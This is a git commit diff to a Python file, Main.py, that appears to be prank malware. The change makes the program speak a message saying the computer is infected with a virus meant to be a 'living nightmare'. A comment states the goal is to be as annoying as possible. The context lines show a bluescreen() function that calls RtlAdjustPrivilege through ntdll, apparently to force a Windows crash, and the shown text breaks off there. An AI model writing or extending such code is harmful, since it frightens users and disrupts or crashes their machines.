70ea9da2cc10bb829f813292951dedc3f4dc8d7a
DJchicken899 <laceywilley@gmail.com>
2025-05-11 17:24:06 -0700

    Update Main.py

--- Main.py
+++ Main.py
@@ -2,9 +2,10 @@ import pyttsx3 as tts
 import time
 import ctypes
 
-Eng = tts.Engine()
-Eng.say('hi')
-Eng.runandwait()
+
+engine =  tts.init()
+engine.say("Hello, your computer has been infected with a virus that will make your computer a living night mare, have fun with this") # living heel as in not blue screen but just as annoything as possible
+engine.runAndWait()
 
 def bluescreen():
     ctypes.windll.ntdll.RtlAdjustPrivilege(20, True, False, ctypes.byref(ctypes.c_bool()))
